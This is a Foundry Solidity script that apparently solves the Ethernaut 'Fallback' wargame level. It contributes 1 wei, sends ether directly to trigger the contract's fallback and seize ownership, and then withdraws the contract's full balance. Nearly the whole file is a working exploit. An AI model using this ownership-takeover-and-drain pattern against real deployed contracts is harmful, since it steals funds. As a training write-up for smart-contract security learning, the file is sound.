//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../src/1_Fallback.sol';
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSol is Script {

    // #Get address I need to declare this contract as payable like this :: (look below)
    Fallback public fallbackContract = Fallback(payable(0x8D15b1A0AE048b87c50c8563D22F15D13E3c31F0));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // contribute < 0.001 ETH
        fallbackContract.contribute{value: 1 wei}();

        // Am I contributer now ?
        // uint256 contributions = fallbackContract.getContribution();
        // console.log('Contribution: ', contributions);
        console.log('Now I am a contributor, msg.sender=',msg.sender);

        // send money to contract with my wallet. this will make me my wallet as the owner of contract.
        address(fallbackContract).call{value: 1 wei}("");
        address ownER = fallbackContract.owner();
        console.log('I m owner', ownER);
        // withdraw all the money form the contract.
        fallbackContract.withdraw();

        vm.stopBroadcast();
    }

}